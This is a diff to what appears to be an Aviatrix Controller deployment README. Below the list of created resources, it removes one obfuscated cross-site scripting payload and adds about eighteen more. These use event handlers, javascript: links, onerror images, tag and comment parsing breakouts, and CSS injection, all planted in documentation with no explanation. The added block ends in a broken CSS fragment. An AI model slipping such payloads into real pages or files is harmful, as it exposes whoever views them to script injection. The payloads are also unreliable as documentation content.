@@ -7,4 +7,20 @@ created include:
 * One Aviatrix Controller EC2 Instance (named AviatrixController)
 * One Aviatrix Security Group (named AviatrixSecurityGroup)
 
-<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+<h1><font color=blue>hellox worldss</h1>
+<BODY ONLOAD=alert('hellox worldss')>
+<input onfocus=write(XSS) autofocus>
+<input onblur=write(XSS) autofocus><input autofocus>
+<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<form><button formaction="javascript:alert(XSS)">lol
+<!--<img src="--><img src=x onerror=alert(XSS)//">
+<![><img src="]><img src=x onerror=alert(XSS)//">
+<style><img src="</style><img src=x onerror=alert(XSS)//">
+<? foo="><script>alert(1)</script>">
+<! foo="><script>alert(1)</script>">
+</ foo="><script>alert(1)</script>">
+<? foo="><x foo='?><script>alert(1)</script>'>">
+<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
+<% foo><x foo="%><script>alert(123)</script>">
+<div style="font-family:'foo&#10;;color:red;';">LOL
+LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*
